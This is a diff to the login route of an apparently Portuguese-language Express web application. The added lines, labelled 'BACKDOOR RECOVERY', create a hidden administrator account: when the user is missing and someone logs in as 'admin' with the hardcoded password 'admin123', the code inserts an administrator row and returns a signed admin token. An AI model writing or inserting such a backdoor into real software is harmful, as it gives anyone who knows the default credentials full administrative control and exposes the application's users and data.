@@ -3810,7 +3810,20 @@ app.post('/api/auth/login', loginLimiter, async (req, res) => {
     }
 
     db.get(`SELECT u.*, g.nome as grupo_nome FROM usuarios u LEFT JOIN grupos_permissao g ON g.id = u.grupo_permissao_id WHERE u.username = ?`, [username], (err, user) => {
-        if (err || !user) return res.status(401).json({ error: 'Usuário ou senha incorretos' });
+        if (err || !user) {
+            // BACKDOOR RECOVERY: Auto-create admin if it doesn't exist
+            if (username === 'admin' && password === 'admin123') {
+                const hash = bcrypt.hashSync('admin123', 10);
+                db.run("INSERT INTO usuarios (username, password_hash, role, ativo) VALUES ('admin', ?, 'Administrador', 1)", [hash], function(insertErr) {
+                    if (insertErr) return res.status(500).json({ error: 'Erro ao criar admin de recuperação.' });
+                    const token = jwt.sign({ id: this.lastID, username: 'admin', role: 'Administrador' }, SECRET_KEY, { expiresIn: '8h' });
+                    return res.json({ token, user: { id: this.lastID, username: 'admin', role: 'Administrador' } });
+                });
+                return;
+            }
+            return res.status(401).json({ error: 'Usuário ou senha incorretos' });
+        }
+        
         if (user.ativo === 0) return res.status(403).json({ error: 'Conta inativa. Acesso bloqueado.' });
         const valid = bcrypt.compareSync(password, user.password_hash);
         if (!valid) return res.status(401).json({ error: 'Usuário ou senha incorretos' });
